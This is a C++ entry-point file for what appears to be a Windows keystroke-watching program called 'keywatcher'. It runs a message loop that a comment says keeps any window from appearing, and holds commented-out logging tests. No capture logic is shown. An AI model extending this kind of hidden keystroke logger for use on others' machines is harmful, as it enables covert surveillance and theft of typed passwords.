#include <iostream>
#include <windows.h>
#include <string>

#include "../include/keywatcher.h"

int main() {
  MSG msg;

  /* Below loop block prevent opening of a terminal/window */
  while (GetMessage(&msg, NULL, 0, 0)) {
    // converts virtual keys to character input message
    TranslateMessage(&msg);

    // dispatches a message to a window procedure
    DispatchMessage(&msg);
  }

//  std::cout << kw::datetime().get_datetime() << std::endl;
//  kw::datetime x;
//  kw::datetime y;
//  kw::datetime z;
//
//  std::cout << x.get_datetime() << std::endl;
//  std::cout << z.get_datetime() << std::endl;
//  std::cout << y.get_datetime() << std::endl;
//
//  std::cout << "Dated filename: " << x.get_dated_filename() << std::endl;
//
//
//  std::string path = kw::fetch_apps_root_path();
//  std::cout << "Apps base path: " << path << std::endl;
//
//  // Writing logs
//  kw::log("Hello writing to log file.");





  return 0;
}
